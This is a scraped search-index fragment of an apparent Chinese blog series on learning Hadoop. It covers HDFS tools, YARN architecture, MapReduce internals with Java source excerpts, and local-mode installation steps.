","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:4:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"五、命令工具 fsck: 检查文件的完整性 start-balancer.sh: 重新平衡HDFS hdfs dfs -copyFromLocal 从本地磁盘复制文件到HDFS ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:5:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop4/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(四)–YARN ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"一、架构 YARN的架构如下图所示： YARN将资源管理和任务调度监控拆分成了独立的进程：一个全局的资源管理和一个每个作业的管理（ApplicationMaster）。 ResourceManager和NodeManager提供了计算资源的分配和管理，而ApplicationMaster则完成应用程序的运行。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"1. ResourceManager 负责全局的资源管理和任务调度，把整个集群当成计算资源池，只关注分配，不管应用，且不负责容错。 资源管理 以前资源是每个节点分成一个个的Map slot和Reduce slot，现在是一个个Container，每个Container可以根据需要运行ApplicationMaster、Map、Reduce或者任意的程序 以前的资源分配是静态的，目前是动态的，资源利用率更高 Container是资源申请的单位，一个资源申请格式：\u003cresource-name, priority, resource-requirement, number-of-containers\u003e, resource-name：主机名、机架名或*（代表任意机器）, resource-requirement：目前只支持CPU和内存 用户提交作业到ResourceManager，然后在某个NodeManager上分配一个Container来运行ApplicationMaster，ApplicationMaster再根据自身程序需要向ResourceManager申请资源 YARN有一套Container的生命周期管理机制，而ApplicationMaster和其Container之间的管理是应用程序自己定义的 任务调度 只关注资源的使用情况，根据需求合理分配资源 Scheluer可以根据申请的需要，在特定的机器上申请特定的资源（ApplicationMaster负责申请资源时的数据本地化的考虑，ResourceManager将尽量满足其申请需求，在指定的机器上分配Container，从而减少数据移动） 内部结构 Client Service: 应用提交、终止、输出信息（应用、队列、集群等的状态信息） Adaminstration Service: 队列、节点、Client权限管理 ApplicationMasterService: 注册、终止ApplicationMaster, 获取ApplicationMaster的资源申请或取消的请求，并将其异步地传给Scheduler, 单线程处理 ApplicationMaster Liveliness Monitor: 接收ApplicationMaster的心跳消息，如果某个ApplicationMaster在一定时间内没有发送心跳，则被任务失效，其资源将会被回收，然后ResourceManager会重新分配一个ApplicationMaster运行该应用（默认尝试2次） Resource Tracker Service: 注册节点, 接收各注册节点的心跳消息 NodeManagers Liveliness Monitor: 监控每个节点的心跳消息，如果长时间没有收到心跳消息，则认为该节点无效, 同时所有在该节点上的Container都标记成无效，也不会调度任务到该节点运行 ApplicationManager: 管理应用程序，记录和管理已完成的应用 ApplicationMaster Launcher: 一个应用提交后，负责与NodeManager交互，分配Container并加载ApplicationMaster，也负责终止或销毁 YarnScheduler: 资源调度分配， 有FIFO(with Priority)，Fair，Capacity方式 ContainerAllocationExpirer: 管理已分配但没有启用的Container，超过一定时间则将其回收 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"2. NodeManager Node节点下的Container管理 启动时向ResourceManager注册并定时发送心跳消息，等待ResourceManager的指令 监控Container的运行，维护Container的生命周期，监控Container的资源使用情况 启动或停止Container，管理任务运行时的依赖包（根据ApplicationMaster的需要，启动Container之前将需要的程序及其依赖包、配置文件等拷贝到本地） 内部结构 NodeStatusUpdater: 启动向ResourceManager注册，报告该节点的可用资源情况，通信的端口和后续状态的维护 ContainerManager: 接收RPC请求（启动、停止），资源本地化（下载应用需要的资源到本地，根据需要共享这些资源） PUBLIC: /filecache PRIVATE: /usercache//filecache APPLICATION: /usercache//appcache//（在程序完成后会被删除） ContainersLauncher: 加载或终止Container ContainerMonitor: 监控Container的运行和资源使用情况 ContainerExecutor: 和底层操作系统交互，加载要运行的程序 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"3. ApplicationMaster 单个作业的资源管理和任务监控 具体功能描述： 计算应用的资源需求，资源可以是静态或动态计算的，静态的一般是Client申请时就指定了，动态则需要ApplicationMaster根据应用的运行状态来决定 根据数据来申请对应位置的资源（Data Locality） 向ResourceManager申请资源，与NodeManager交互进行程序的运行和监控，监控申请的资源的使用情况，监控作业进度 跟踪任务状态和进度，定时向ResourceManager发送心跳消息，报告资源的使用情况和应用的进度信息 负责本作业内的任务的容错 ApplicationMaster可以是用任何语言编写的程序，它和ResourceManager和NodeManager之间是通过ProtocolBuf交互，以前是一个全局的JobTracker负责的，现在每个作业都一个，可伸缩性更强，至少不会因为作业太多，造成JobTracker瓶颈。同时将作业的逻辑放到一个独立的ApplicationMaster中，使得灵活性更加高，每个作业都可以有自己的处理方式，不用绑定到MapReduce的处理模式上 如何计算资源需求 一般的MapReduce是根据block数量来定Map和Reduce的计算数量，然后一般的Map或Reduce就占用一个Container 如何发现数据的本地化 通过HDFS的block分片信息获取 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"4. Container 资源申请的单位和任务运行的容器： 基本的资源单位（CPU、内存等） Container可以加载任意程序，而且不限于Java 一个Node可以包含多个Container，也可以是一个大的Container ApplicationMaster可以根据需要，动态申请和释放Container ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"5. Failover 失败类型 程序问题 进程崩溃 硬件问题 失败处理 任务失败 运行时异常或者JVM退出都会报告给ApplicationMaster 通过心跳来检查挂住的任务(timeout)，会检查多次（可配置）才判断该任务是否失效 一个作业的任务失败率超过配置，则认为该作业失败 失败的任务或作业都会有ApplicationMaster重新运行 ApplicationMaster失败 ApplicationMaster定时发送心跳信号到ResourceManager，通常一旦ApplicationMaster失败，则认为失败，但也可以通过配置多次后才失败 一旦ApplicationMaster失败，ResourceManager会启动一个新的ApplicationMaster 新的ApplicationMaster负责恢复之前错误的ApplicationMaster的状态(yarn.app.mapreduce.am.job.recovery.enable=true)，这一步是通过将应用运行状态保存到共享的存储上来实现的，ResourceManager不会负责任务状态的保存和恢复 Client也会定时向ApplicationMaster查询进度和状态，一旦发现其失败，则向ResouceManager询问新的ApplicationMaster NodeManager失败 NodeManager定时发送心跳到ResourceManager，如果超过一段时间没有收到心跳消息，ResourceManager就会将其移除 任何运行在该NodeManager上的任务和ApplicationMaster都会在其他NodeManager上进行恢复 如果某个NodeManager失败的次数太多，ApplicationMaster会将其加入黑名单（ResourceManager没有），任务调度时不在其上运行任务 ResourceManager失败 通过checkpoint机制，定时将其状态保存到磁盘，然后失败的时候，重新运行 通过zookeeper同步状态和实现透明的HA 可以看出，一般的错误处理都是由当前模块的父模块进行监控（心跳）和恢复。而最顶端的模块则通过定时保存、同步状态和zookeeper来ֹ实现HA ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:5","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"二、基本流程 YARN的基本流程可以用以下两个图来表示： 1. Job submission 从ResourceManager中获取一个Application ID 检查作业输出配置，计算输入分片 拷贝作业资源（job jar、配置文件、分片信息）到HDFS，以便后面任务的执行 2. Job initialization ResourceManager将作业递交给Scheduler（有很多调度算法，一般是根据优先级）Scheduler为作业分配一个Container，ResourceManager就加载一个application master process并交给NodeManager管理ApplicationMaster主要是创建一系列的监控进程来跟踪作业的进度，同时获取输入分片，为每一个分片创建一个Map task和相应的reduce task Application Master还决定如何运行作业，如果作业很小（可配置），则直接在同一个JVM下运行 3. Task assignment ApplicationMaster向Resource Manager申请资源（一个个的Container，指定任务分配的资源要求）一般是根据data locality来分配资源 4. Task execution ApplicationMaster根据ResourceManager的分配情况，在对应的NodeManager中启动Container 从HDFSN#x4E2D;读取任务所需资源（job jar，配置文件等），然后执行该任务 5. Progress and status update 定时将任务的进度和状态报告给ApplicationMaster Client定时向ApplicationMaster获取整个任务的进度和状态 6. Job completion Client定时检查整个作业是否完成 作业完成后，会清空临时文件、目录等 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop3/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(三)–MapReduce ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"一、简介 MapReduce是一种分布式计算方式，指定一个Map函数，把一组键值对映射成一组新的键值对，指定并发的Reduce（归约）函数，用来保证所有映射的键值对中的每一个共享相同的键组。 其Pattern图如下： map: (K1, V1) → list(K2, V2) combine: (K2, list(V2)) → list(K2, V2) reduce: (K2, list(V2)) → list(K3, V3) Map输出格式和Reduce输入格式一定是相同的。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"二、流程 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"1. 基本流程 MapReduce主要是先读取文件数据，然后进行Map处理，接着Reduce处理，最后把处理结果写到文件中。流程图如下： ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"2. 详细流程 处理的详细流程如下： ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"3. 多节点下的流程 多节点的流程如下： ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"4. 数据角度流程处理 数据流的处理过程如下： Record reader 记录阅读器会翻译由输入格式生成的记录，记录阅读器用于将数据解析给记录，并不分析记录自身。它将数据以键值对的形式传输给mapper。通常键是位置信息，值是构成记录的数据存储块。 Map 在映射器中用户提供的代码称为中间对。键决定了数据分类的依据，而值决定了处理器中的分析信息.本书的设计模式将会展示大量细节来解释特定键值如何选择。 Shuffle and Sort ruduce任务以随机和排序步骤开始。此步骤写入输出文件并下载到本地计算机。这些数据采用键进行排序以把等价密钥组合到一起。 Reduce reducer采用分组数据作为输入。该功能传递键和此键相关值的迭代器。可以采用多种方式来汇总、过滤或者合并数据。当ruduce功能完成，就会发送0个或多个键值对。 输出格式 输出格式会转换最终的键值对并写入文件。默认情况下键和值以tab分割，各记录以换行符分割。因此可以自定义更多输出格式，最终数据会写入HDFS。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"三、分阶段过程详细分析 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"1. Hadoop读取数据 通过InputFormat决定读取的数据的类型（可以是文件或数据库等），然后拆分成InputSplit，每个InputSplit对应一个Map处理，RecordReader读取InputSplit内容给到Map。 功能 验证作业输入的正确性，如格式等 将输入文件切割成逻辑分片（InputSplit），一个InputSplit分配给一个独立的Map任务 提供ReocrdReader实现，读取InputSplit中的“K-V”对给Mapper使用 方法 List getSplits(): 获取由输入文件计算出输入分片(InputSplit)，解决数据或文件分割成片问题 RecordReader createRecordReader(): 创建RecordReader，从InputSplit中读取数据，解决读取分片中数据问题 TextInputFormat: 输入文件中的每一行就是一个记录，Key是这一行的byte offset，而value是这一行的内容 KeyValueTextInputFormat: 输入文件中每一行就是一个记录，第一个分隔符字符切分每行。在分隔符字符之前的内容为Key，在之后的为Value。分隔符变量通过key.value.separator.in.input.line变量设置，默认为(\\t)字符。 NLineInputFormat: 与TextInputFormat一样，但每个数据块必须保证有且只有Ｎ行，mapred.line.input.format.linespermap属性，默认为１ SequenceFileInputFormat: 一个用来读取字符流数据的InputFormat，\u003ckey,value\u003e为用户自定义的。字符流数据是Hadoop自定义的压缩的二进制数据格式。它用来优化从一个MapReduce任务的输出到另一个MapReduce任务的输入之间的数据传输过程。\u003c/key,value\u003e **InputSplit：**代表一个个逻辑分片，并没有真正存储数据，只是提供了一个如何将数据分片的方法 Split内有Location信息，利于数据局部化。一个InputSplit给一个单独的Map处理 public abstract class InputSplit { /** * 获取Split的大小，支持根据size对InputSplit排序. */ public abstract long getLength() throws IOException, InterruptedException; /** * 获取存储该分片的数据所在的节点位置. */ public abstract String[] getLocations() throws IOException, InterruptedException; } ``` **RecordReader：**将InputSplit拆分成一个个\u003ckey,value\u003e对给Map处理，也是实际的文件读取分隔对象\u003c/key,value\u003e ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"2. 问题 大量小文件如何处理 CombineFileInputFormat可以将若干个Split打包成一个，目的是避免过多的Map任务（因为Split的数目决定了Map的数目，大量的Mapper Task创建销毁开销将是巨大的） 怎么计算split的 通常一个split就是一个block（FileInputFormat仅仅拆分比block大的文件），这样做的好处是使得Map可以在存储有当前数据的节点上运行本地的任务，而不需要通过网络进行跨节点的任务调度 通过mapred.min.split.size， mapred.max.split.size，block.size来控制拆分的大小 如果mapred.min.split.size大于block size，则会将两个block合成到一个split，这样有部分block数据需要通过网络读取 如果mapred.max.split.size小于block size，则会将一个block拆成多个split，增加了Map任务数（Map对split进行计算并且上报结果，关闭当前计算打开新的split均需要耗费资源） 先获取文件在HDFS上的路径和Block信息，然后根据splitSize对文件进行切分（ splitSize = computeSplitSize(blockSize, minSize, maxSize) ），默认splitSize 就等于blockSize的默认值（64m） public List\u003cInputSplit\u003e getSplits(JobContext job) throws IOException { // 首先计算分片的最大和最小值。这两个值将会用来计算分片的大小 long minSize = Math.max(getFormatMinSplitSize(), getMinSplitSize(job)); long maxSize = getMaxSplitSize(job); // generate splits List\u003cInputSplit\u003e splits = new ArrayList\u003cInputSplit\u003e(); List\u003cFileStatus\u003e files = listStatus(job); for (FileStatus file: files) { Path path = file.getPath(); long length = file.getLen(); if (length != 0) { FileSystem fs = path.getFileSystem(job.getConfiguration()); // 获取该文件所有的block信息列表[hostname, offset, length] BlockLocation[] blkLocations = fs.getFileBlockLocations(file, 0, length); // 判断文件是否可分割，通常是可分割的，但如果文件是压缩的，将不可分割 if (isSplitable(job, path)) { long blockSize = file.getBlockSize(); // 计算分片大小 // 即 Math.max(minSize, Math.min(maxSize, blockSize)); long splitSize = computeSplitSize(blockSize, minSize, maxSize); long bytesRemaining = length; // 循环分片。 // 当剩余数据与分片大小比值大于Split_Slop时，继续分片， 小于等于时，停止分片 while (((double) bytesRemaining)/splitSize \u003e SPLIT_SLOP) { int blkIndex = getBlockIndex(blkLocations, length-bytesRemaining); splits.add(makeSplit(path, length-bytesRemaining, splitSize, blkLocations[blkIndex].getHosts())); bytesRemaining -= splitSize; } // 处理余下的数据 if (bytesRemaining != 0) { splits.add(makeSplit(path, length-bytesRemaining, bytesRemaining, blkLocations[blkLocations.length-1].getHosts())); } } else { // 不可split，整块返回 splits.add(makeSplit(path, 0, length, blkLocations[0].getHosts())); } } else { // 对于长度为0的文件，创建空Hosts列表，返回 splits.add(makeSplit(path, 0, length, new String[0])); } } // 设置输入文件数量 job.getConfiguration().setLong(NUM_INPUT_FILES, files.size()); LOG.debug(\"Total # of splits: \" + splits.size()); return splits; } 分片间的数据如何处理 split是根据文件大小分割的，而一般处理是根据分隔符进行分割的，这样势必存在一条记录横跨两个split ​ 解决办法是只要不是第一个split，都会远程读取一条记录。不是第一个split的都忽略到第一条记录 public class LineRecordReader extends RecordReader\u003cLongWritable, Text\u003e { private CompressionCodecFactory compressionCodecs = null; private long start; private long pos; private long end; private LineReader in; private int maxLineLength; private LongWritable key = null; private Text value = null; // initialize函数即对LineRecordReader的一个初始化 // 主要是计算分片的始末位置，打开输入流以供读取K-V对，处理分片经过压缩的情况等 public void initialize(InputSplit genericSplit, TaskAttemptContext context) throws IOException { FileSplit split = (FileSplit) genericSplit; Configuration job = context.getConfiguration(); this.maxLineLength = job.getInt(\"mapred.linerecordreader.maxlength\", Integer.MAX_VALUE); start = split.getStart(); end = start + split.getLength(); final Path file = split.getPath(); compressionCodecs = new CompressionCodecFactory(job); final CompressionCodec codec = compressionCodecs.getCodec(file); // 打开文件，并定位到分片读取的起始位置 FileSystem fs = file.getFileSystem(job); FSDataInputStream fileIn = fs.open(split.getPath()); boolean skipFirstLine = false; if (codec != null) { // 文件是压缩文件的话，直接打开文件 in = new LineReader(codec.createInputStream(fileIn), job); end = Long.MAX_VALUE; } else { // 只要不是第一个split，则忽略本split的第一行数据 if (start != 0) { skipFirstLine = true; --start; // 定位到偏移位置，下次读取就会从偏移位置开始 fileIn.seek(start); } in = new LineReader(fileIn, job); } if (skipFirstLine) { // 忽略第一行数据，重新定位start start += in.readLine(new Text(), 0, (int) Math.min((long) Integer.MAX_VALUE, end - start)); } this.pos = start; } public boolean nextKeyValue() throws IOException { if (key == null) { key = new LongWritable(); } key.set(pos);// ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"3. Mapper 主要是读取InputSplit的每一个Key,Value对并进行处理： public class Mapper\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e { /** * 预处理，仅在map task启动时运行一次 */ protected void setup(Context context) throws IOException, InterruptedException { } /** * 对于InputSplit中的每一对\u003ckey, value\u003e都会运行一次 */ @SuppressWarnings(\"unchecked\") protected void map(KEYIN key, VALUEIN value, Context context) throws IOException, InterruptedException { context.write((KEYOUT) key, (VALUEOUT) value); } /** * 扫尾工作，比如关闭流等 */ protected void cleanup(Context context) throws IOException, InterruptedException { } /** * map task的驱动器 */ public void run(Context context) throws IOException, InterruptedException { setup(context); while (context.nextKeyValue()) { map(context.getCurrentKey(), context.getCurrentValue(), context); } cleanup(context); } } public class MapContext\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e extends TaskInputOutputContext\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e { private RecordReader\u003cKEYIN, VALUEIN\u003e reader; private InputSplit split; /** * Get the input split for this map. */ public InputSplit getInputSplit() { return split; } @Override public KEYIN getCurrentKey() throws IOException, InterruptedException { return reader.getCurrentKey(); } @Override public VALUEIN getCurrentValue() throws IOException, InterruptedException { return reader.getCurrentValue(); } @Override public boolean nextKeyValue() throws IOException, InterruptedException { return reader.nextKeyValue(); } } ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"4.Shuffle 对Map的结果进行排序并传输到Reduce进行处理 Map的结果并不是直接存放到硬盘,而是利用缓存做一些预排序处理 Map会调用Combiner，压缩，按key进行分区、排序等，尽量减少结果的大小 每个Map完成后都会通知Task，然后Reduce就可以进行处理 Map端 当Map程序开始产生结果的时候，并不是直接写到文件的，而是利用缓存做一些排序方面的预处理操作 每个Map任务都有一个循环内存缓冲区（默认100MB），当缓存的内容达到80%时，后台线程开始将内容写到文件，此时Map任务可以继续输出结果，但如果缓冲区满了，Map任务则需要等待 写文件使用round-robin方式。在写入文件之前，先将数据按照Reduce进行分区。对于每一个分区，都会在内存中根据key进行排序，如果配置了Combiner，则排序后执行Combiner（Combine之后可以减少写入文件和传输的数据） 每次结果达到缓冲区的阀值时，都会创建一个文件，在Map结束时，可能会产生大量的文件。在Map完成前，会将这些文件进行合并和排序。如果文件的数量超过3个，则合并后会再次运行Combiner（1、2个文件就没有必要了） 如果配置了压缩，则最终写入的文件会先进行压缩，这样可以减少写入和传输的数据 一旦Map完成，则通知任务管理器，此时Reduce就可以开始复制结果数据 Reduce端 Map的结果文件都存放到运行Map任务的机器的本地硬盘中 如果Map的结果很少，则直接放到内存，否则写入文件中 同时后台线程将这些文件进行合并和排序到一个更大的文件中（如果文件是压缩的，则需要先解压） 当所有的Map结果都被复制和合并后，就会调用Reduce方法 Reduce结果会写入到HDFS中 调优 一般的原则是给shuffle分配尽可能多的内存，但前提是要保证Map、Reduce任务有足够的内存 对于Map，主要就是避免把文件写入磁盘，例如使用Combiner，增大io.sort.mb的值 对于Reduce，主要是把Map的结果尽可能地保存到内存中，同样也是要避免把中间结果写入磁盘。默认情况下，所有的内存都是分配给Reduce方法的，如果Reduce方法不怎么消耗内存，可以mapred.inmem.merge.threshold设成0，mapred.job.reduce.input.buffer.percent设成1.0 在任务监控中可通过Spilled records counter来监控写入磁盘的数，但这个值是包括map和reduce的 对于IO方面，可以Map的结果可以使用压缩，同时增大buffer size（io.file.buffer.size，默认4kb） 配置 属性 默认值 描述 io.sort.mb 100 映射输出分类时所使用缓冲区的大小. io.sort.record.percent 0.05 剩余空间用于映射输出自身记录.在1.X发布后去除此属性.随机代码用于使用映射所有内存并记录信息. io.sort.spill.percent 0.80 针对映射输出内存缓冲和记录索引的阈值使用比例. io.sort.factor 10 文件分类时合并流的最大数量。此属性也用于reduce。通常把数字设为100. min.num.spills.for.combine 3 组合运行所需最小溢出文件数目. mapred.compress.map.output false 压缩映射输出. mapred.map.output.compression.codec DefaultCodec 映射输出所需的压缩解编码器. mapred.reduce.parallel.copies 5 用于向reducer传送映射输出的线程数目. mapred.reduce.copy.backoff 300 时间的最大数量，以秒为单位，这段时间内若reducer失败则会反复尝试传输 io.sort.factor 10 组合运行所需最大溢出文件数目. mapred.job.shuffle.input.buffer.percent 0.70 随机复制阶段映射输出缓冲器的堆栈大小比例 mapred.job.shuffle.merge.percent 0.66 用于启动合并输出进程和磁盘传输的映射输出缓冲器的阀值使用比例 mapred.inmem.merge.threshold 1000 用于启动合并输出和磁盘传输进程的映射输出的阀值数目。小于等于0意味着没有门槛，而溢出行为由 mapred.job.shuffle.merge.percent单独管理. mapred.job.reduce.input.buffer.percent 0.0 用于减少内存映射输出的堆栈大小比例，内存中映射大小不得超出此值。若reducer需要较少内存则可以提高该值. ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"5. 编程 处理 select：直接分析输入数据，取出需要的字段数据即可 where: 也是对输入数据处理的过程中进行处理，判断是否需要该数据 aggregation:min, max, sum group by: 通过Reducer实现 sort join: map join, reduce join Third-Party Libraries # 第一种 export LIBJARS=$MYLIB/commons-lang-2.3.jar, hadoop jar prohadoop-0.0.1-SNAPSHOT.jar org.aspress.prohadoop.c3. WordCountUsingToolRunner -libjars $LIBJARS #第二种 hadoop jar prohadoop-0.0.1-SNAPSHOT-jar-with-dependencies.jar org.aspress.prohadoop.c3. WordCountUsingToolRunner The dependent libraries are now included inside the application JAR file 一般还是第一种的好，指定依赖可以利用Public Cache，如果是包含依赖，则每次都需要拷贝。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:5","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"四、参考文献 w3 school MapReduce Design Patterns ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:4:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(二)–环境搭建–本机模式 ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"前言 有条件的买一组服务器做集群，没有条件的配置高性能机器搭建虚拟机。此处以虚拟机进行搭建集群（多个Linux主机）。 第一次首先进行本机模式的Hadoop搭建。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"一、虚拟机 centos7, 创建新用户，具有root权限。 在/opt目录下创建两个文件夹，分别为modules和software sudo mkdir modules sudo mkdir software ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"二、JAVA环境配置 centos7自带java环境，但自带的openjdk没有增加对java监控命令jps的支持，两种解决方案：卸载原有的openjdk进行再重装或者通过yum安装jdk开发插件。此处我们采用第一种解决方案： 下载Oracle版本JDK，jdk-7u67-linux-x64.tar.gz，并解压，然后配置好环境变量： tar -zxvf jdk-7u67-linux-x64.tar.gz -C /opt/modules export JAVA_HOME=/usr/local/jdk1.7.0_67 export PATH=$JAVA_HOME/bin:$PATH 对java环境进行验证： （务必确保java环境正确，java版本可以自行尝试，此处我使用了一个较老的版本） ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:3:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"三、Hadoop环境配置 下载Apache Hadoop，到官网下载即可，此处使用的是Hadoop-2.10.0（建议使用Binary，因为刚开始可能不熟悉源码编译）： 进入，然后选择一个链接点击下载，也可以直接使用wget下载： 下载后的文件建议放在/opt/modules下面一份，然后解压到/usr/local/路径下。 在.bashrc文件中配置Hadoop的环境变量： export HADOOP_HOME=/usr/local/hadoop-2.10.0 尝试运行：hadoop version 如果不报错，说明安装没有问题，可以跳过进入下面的验证，如果此处报错： ​ 运行其他的hadoop jar之类的命令也提示此问题，说明环境变量配置存在问题，可以尝试采用以下解决方式： ​ 在.bashrc中添加如下内容： export HADOOP_HOME=/usr/local/hadoop-2.10.0 #hadoop的环境变量，前面已经设置过 export HADOOP_INSTALL=$HADOOP_HOME export HADOOP_MAPRED_HOME=$HADOOP_HOME export HADOOP_COMMON_HOME=$HADOOP_HOME export HADOOP_HDFS_HOME=$HADOOP_HOME export YARN_HOME=$HADOOP_HOME export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin export HADOOP_CONF_DIR=$HADOOP_HOME export HADOOP_PREFIX=$HADOOP_HOME export HADOOP_LIBEXEC_DIR=$HADOOP_HOME/libexec export JAVA_LIBRARY_PATH=$HADOOP_HOME/lib/native:$JAVA_LIBRARY_PATH export HADOOP_CONF_DIR=$HADOOP_PREFIX/etc/hadoop ​ 然后进行 source ~/.bashrc，此时再运行hadoop version进行验证： ","date":"2020-03-03","objectID":"/2020/03/Hadoop2-1/:4:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2020/03/Hadoop2-1/"},{"categories":["Vuln"],"content":"四、环境验证 验证一个简单的Hadoop示例。 Hadoop安装提供了以下示例MapReduce jar文件，它提供了MapReduce的基本功能，可用于计算，如Pi值，文件列表中的字数等。 新建目录：mkdir /tmp/input 拷贝几个txt文件：cp $HADOOP_HOME/*.txt input 检查待测文件： ls -l input #输出 total 124 -rw-r--r-- 1 root root 106210 Mar 5 22:54 LICENSE.txt -rw-r--r-- 1 root root 15841 